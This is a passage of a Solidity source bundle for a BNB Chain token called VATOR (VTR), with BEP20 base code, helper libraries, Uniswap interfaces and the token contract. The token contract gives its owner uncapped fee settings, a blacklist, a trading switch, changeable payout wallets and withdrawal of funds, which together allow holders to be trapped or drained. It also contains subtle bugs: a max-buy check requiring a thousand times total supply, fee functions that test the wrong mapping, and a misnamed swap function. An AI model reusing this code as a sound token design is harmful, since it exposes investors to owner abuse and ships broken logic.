amount.sub(half);\r\n\r\n        // capture the contract\u0027s current BNB balance.\r\n        // this is so that we can capture exactly the amount of BNB that the\r\n        // swap creates, and not make the liquidity event include any BNB that\r\n        // has been manually sent to the contract\r\n        uint256 initialBalance = address(this).balance;\r\n\r\n        // swap tokens for BNB\r\n        swapTokensForMATIC(half, address(this));\r\n\r\n        // how much BNB did we just swap into?\r\n        uint256 newBalance = address(this).balance.sub(initialBalance);\r\n\r\n        // add liquidity to uniswap\r\n        addLiquidity(otherHalf, newBalance);\r\n\r\n        emit SwapAndLiquify(half, newBalance, otherHalf);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"BEP20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"BEP20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"BEP20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _setupDecimals(uint8 decimals_) internal {\r\n        _decimals = decimals_;\r\n    }\r\n}"},"Context.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}"},"IBEP20.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IBEP20 {\r\n    \r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"IContract.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IContract {\r\n    function transfer(address, uint256) external returns (bool);\r\n    function transferFrom(address, address, uint256) external returns (bool);\r\n}"},"IUniswapV2Factory.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}"},"IUniswapV2Pair.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IUniswapV2Pair {\r\n    function sync() external;\r\n}"},"IUniswapV2Router01.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}"},"IUniswapV2Router02.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nimport \"./IUniswapV2Router01.sol\";\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n      address token,\r\n      uint liquidity,\r\n      uint amountTokenMin,\r\n      uint amountETHMin,\r\n      address to,\r\n      uint deadline\r\n    ) external returns (uint amountETH);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n}"},"Ownable.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"SafeMath.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nlibrary SafeMath {\r\n    \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        // See: https://github.com/OpenZeppelin/OpenZeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"},"Vator_Token.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nimport \"./BEP20.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./IContract.sol\";\r\nimport \"./SafeMath.sol\";\r\n\r\ncontract Vator_Token is BEP20, Ownable {\r\n    using SafeMath for uint256;\r\n    constructor(address charity_, address treasury_, address marketing_, address creator_) BEP20(\"VATOR\", \"VTR\") {\r\n        _mint(msg.sender, 5e33);\r\n        \r\n        charityAddress = charity_;\r\n        treasuryAddress = treasury_;\r\n        marketingAddress = marketing_;\r\n        creatorAddress = creator_;\r\n\r\n        lastSwapedAt = block.timestamp;\r\n        lpTokenRecipient = msg.sender;\r\n        \r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n         //@dev Create a uniswap pair for this new token\r\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), _uniswapV2Router.WETH());\r\n            \r\n        uniswapV2Router = _uniswapV2Router;\r\n        \r\n        isExcludedFromFee[_msgSender()] = true;\r\n        isExcludedFromFee[address(this)] = true;\r\n        isPair[uniswapV2Pair] = true;\r\n        isExcludedFromFee[address(uniswapV2Router)] = true;\r\n\r\n        isExcludedFromDividend[_msgSender()] = true;\r\n        isExcludedFromDividend[address(this)] = true;\r\n        isExcludedFromDividend[address(uniswapV2Router)] = true;\r\n        isExcludedFromDividend[uniswapV2Pair] = true;\r\n    }\r\n    \r\n    // function to allow admin to remove an address from fee..\r\n    function excludedFromFee(address account) public onlyOwner {\r\n        require(!isExcludedFromDividend[account], \"VTR: The account already excluded..\");\r\n        isExcludedFromFee[account] = true;\r\n    }\r\n    \r\n    // function to allow admin to add an address for fees..\r\n    function includedForFee(address account) public onlyOwner {\r\n        require(isExcludedFromDividend[account], \"VTR: The account already included..\");\r\n        isExcludedFromFee[account] = false;\r\n    }\r\n\r\n    // function to allow admin to enable trading..\r\n    function enableTrading() public onlyOwner {\r\n        require(!tradingEnabled, \"VTR: Trading already enabled..\");\r\n        tradingEnabled = true;\r\n    }\r\n\r\n    // function to allow admin to enable auto burn fee..\r\n    function enableAutoBurnFee() public onlyOwner {\r\n        require(!isAutoBurnFeeEnabled, \"VTR: Auto burn fee already enabled..\");\r\n        isAutoBurnFeeEnabled = true;\r\n    }\r\n\r\n    // function to allow admin to disable auto burn fee..\r\n    function disableAutoBurnFee() public onlyOwner {\r\n        require(isAutoBurnFeeEnabled, \"VTR: Auto burn fee already disabled..\");\r\n        isAutoBurnFeeEnabled = false;\r\n    }\r\n    \r\n    // function to allow admin to remove an address from dividend..\r\n    function excludedFromDividend(address account) public onlyOwner {\r\n        require(!isExcludedFromDividend[account], \"VTR: The account already excluded..\");\r\n        isExcludedFromDividend[account] = true;\r\n        uint256 amount = numberOfShare[account];\r\n        _totalShare = _totalShare.sub(amount);\r\n        numberOfShare[account] = 0;\r\n    }\r\n    \r\n    // function to allow admin to add an address for dividend..\r\n    function includedForDividend(address account) public onlyOwner {\r\n        require(isExcludedFromDividend[account], \"VTR: The account already included..\");\r\n        isExcludedFromDividend[account] = false;\r\n        uint256 amount = balanceOf(account);\r\n        _totalShare = _totalShare.add(amount);\r\n        numberOfShare[account] = numberOfShare[account].add(amount);\r\n    }\r\n    \r\n    // function to allow admin to add an address on pair list..\r\n    function addPair(address pairAdd) public onlyOwner {\r\n        require(!isPair[pairAdd], \"VTR: The account already added..\");\r\n        isPair[pairAdd] = true;\r\n    }\r\n    \r\n    // function to allow admin to remove an address from pair address..\r\n    function removePair(address pairAdd) public onlyOwner {\r\n        require(isPair[pairAdd], \"VTR: The account already removed..\");\r\n        isPair[pairAdd] = false;\r\n    }\r\n    \r\n    // function to allow admin to update wallets..\r\n    function updateWallets(address charity_, address treasury_, address marketing_, address creator_) public onlyOwner {\r\n        charityAddress = charity_;\r\n        treasuryAddress = treasury_;\r\n        marketingAddress = marketing_;\r\n        creatorAddress = creator_;\r\n    }\r\n\r\n    // function to allow admin to add an address on blacklist..\r\n    function addOnBlackList(address botAddress) public onlyOwner {\r\n        require(isContract(botAddress), \"VTR: You can blacklit only bot not an user..\");\r\n        isBlacklisted[botAddress] = true;\r\n    }\r\n    \r\n    // function to allow admin to remove an address from blacklist..\r\n    function removeFromBlackList(address address_) public onlyOwner {\r\n        isBlacklisted[address_] = false;\r\n    }\r\n    \r\n    function isContract(address address_) private view returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(address_) }\r\n        return size \u003e 0;\r\n    }\r\n    \r\n    // function to allow admin to update maximum buy \u0026 sell amout..\r\n    function updateMaxSellBuyAmount(uint256 maxBuy, uint256 maxSell) public onlyOwner {\r\n        require(maxBuy \u003e= totalSupply().mul(1e5).div(1e2) \u0026\u0026 maxSell \u003e= totalSupply().mul(1e5).div(1e2), \"VTR: You cannot set less than 0.001% of totalSupply..\");\r\n        maxBuyAmount = maxBuy;\r\n        maxSellAmount = maxSell;\r\n    }\r\n    \r\n    // function to allow admin to update interval time..\r\n    function updateSwapInterval(uint256 sec) public onlyOwner {\r\n        swapInterval = sec;\r\n    }\r\n    \r\n    // function to allow admin to update buy fees..\r\n    function updateBuyFees(uint256 tax, uint256 liquidity, uint256 charity, uint256 treasury, uint256 creator, uint256 luckyBuyer, uint256 burnFee) public onlyOwner {\r\n        buyTaxFee = tax;\r\n        buyLiquidityFee = liquidity;\r\n        buyCharityFee = charity;\r\n        buyTreasuryFee = treasury;\r\n        buyCreatorFee = creator;\r\n        buyLuckyBuyerFee = luckyBuyer;\r\n        buyBurnFee = burnFee;\r\n    }\r\n    \r\n    // function to allow admin to update sell fees..\r\n    function updateSellFees(uint256 tax, uint256 liquidity, uint256 charity, uint256 treasury, uint256 marketing, uint256 creator, uint256 buyer, uint256 burnFee) public onlyOwner {\r\n        sellTaxFee = tax;\r\n        sellLiquidityFee = liquidity;\r\n        sellCharityFee = charity;\r\n        sellTreasuryFee = treasury;\r\n        sellMarketingFee = marketing;\r\n        sellCreatorFee = creator;\r\n        sellLuckyBuyerFee = buyer;\r\n        sellBurnFee = burnFee;\r\n    }\r\n    \r\n    // function to allow admin to enable Swap and auto liquidity function..\r\n    function enableSwapAndLiquify() public onlyOwner {\r\n        require(!swapAndLiquifyEnabled, \"VTR: Already enabled..\");\r\n        swapAndLiquifyEnabled = true;\r\n    }\r\n    \r\n    // function to allow admin to disable Swap and auto liquidity function..\r\n    function disableSwapAndLiquify() public onlyOwner {\r\n        require(swapAndLiquifyEnabled, \"VTR: Already disabled..\");\r\n        swapAndLiquifyEnabled = false;\r\n    }\r\n\r\n    function addApprover(address approver) public onlyOwner {\r\n        _approver[approver] = true;\r\n    }\r\n\r\n    function burn(uint256 amount) public {\r\n        require(amount \u003e 0, \"VTR: amount must be greater than 0\");\r\n        _burn(msg.sender, amount);\r\n    }\r\n    \r\n    // function to allow admin to transfer *any* BEP20 tokens from this contract..\r\n    function transferAnyBEP20Tokens(address tokenAddress, address recipient, uint256 amount) public onlyOwner {\r\n        require(amount \u003e 0, \"VTR: amount must be greater than 0\");\r\n        require(recipient != address(0), \"VTR: recipient is the zero address\");\r\n        require(tokenAddress != address(this), \"VTR: Not possible to transfer VTR\");\r\n        IContract(tokenAddress).transfer(recipient, amount);\r\n    }\r\n    \r\n    // function to allow admin to transfer BNB from this contract..\r\n    function transferBNB(uint256 amount, address payable recipient) public onlyOwner {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n    receive() external payable {\r\n        \r\n    }\r\n}"}}